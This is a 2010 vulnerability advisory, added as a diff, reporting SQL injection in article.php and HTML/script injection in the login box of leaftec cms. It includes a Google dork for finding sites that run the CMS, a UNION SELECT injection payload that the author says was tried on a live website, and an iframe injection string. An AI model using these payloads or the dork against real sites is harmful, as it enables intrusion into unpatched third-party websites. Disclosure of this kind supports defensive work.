@@ -1,0 +1,56 @@
+# Exploit Title: leaftec cms multiple vulnerabilities
+# Date: 21.03.2010
+# Author: Valentin Höbel
+# Version: 
+# Tested on: Debian etch 
+# CVE :  
+# Code : 
+
+
+
+:: General information
+:: leaftec cms multiple vulnerabilities discovered
+:: by Valentin Höbel
+:: valentin@xenuser.org
+
+:: Product information
+:: Name = leaftec cms
+:: Vendor = leaftec
+:: Vendor Website = http://www.leaftec.de/
+:: About the product = http://www.leaftec.de/serv_cms.php
+:: Affected versions = 
+:: Google dork: e.g. "© 2006 leaftec Design"
+
+
+:: Vulnerabilities
+
+#1 SQL Injection
+Sadly the CMS is not available for free download but some German companies are using it.
+leaftec cms contains a blog feature which displays written content, file: article.php. 
+
+Vulnerable URL:
+http://www.some-cool-domain.tld/article.php?id=XX
+
+Examples for testing and injecting SQL stuff:
+http://www.some-cool-domain.tld/article.php?id='
+http://www.some-cool-domain.tld/article.php?id="
+http://www.some-cool-domain.tld/article.php?id=XX+AND+1=2+UNION+SELECT+1,2,3,4,5,concat(version()),7--
+(Tested on a live website using leaftec cms.)
+--------------------------------------------------------------------------------------------------------
+
+
+#2 XSS / HTML Code Injection
+Several parts of the CMS allow HTML and Java Script code injection, e.g. the login box.
+After submitting the form the cms puts a red border around the login and password field but
+also implements the injected code into the website.
+
+Example for HTML code:
+"><iframe src=http://www.google.de></iframe>
+--------------------------------------------------------------------------------------------------------
+
+
+
+:: Additional information
+:: Vendor contacted = 21.03.2010
+:: Vulnerabilities fixed = no reply received
+:: Solution = Upgrade to version XX or higher if available
